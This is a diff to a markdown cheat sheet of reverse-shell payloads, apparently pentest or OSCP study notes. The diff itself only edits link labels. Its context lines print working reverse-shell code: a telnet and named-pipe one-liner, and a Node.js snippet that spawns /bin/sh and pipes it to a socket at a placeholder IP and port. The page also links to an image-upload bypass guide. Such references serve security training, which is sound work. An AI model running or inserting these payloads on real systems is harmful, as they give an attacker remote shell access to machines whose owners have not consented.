@@ -42,7 +42,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet IP PORT 0/tmp/p
 
 ## PHP
 
-[Image upload bypass](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html)
+[sushant747.gitbooks.io/bypass_image_upload.html](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html)
 
 ```bash
 # one liner
@@ -119,7 +119,7 @@ show options
 
 ## node.js
 
-[https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py](https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py)
+[0x4ndr3/JSgen/JSgen.py](https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py)
 
 ```bash
 (function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(PORT, "IP", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
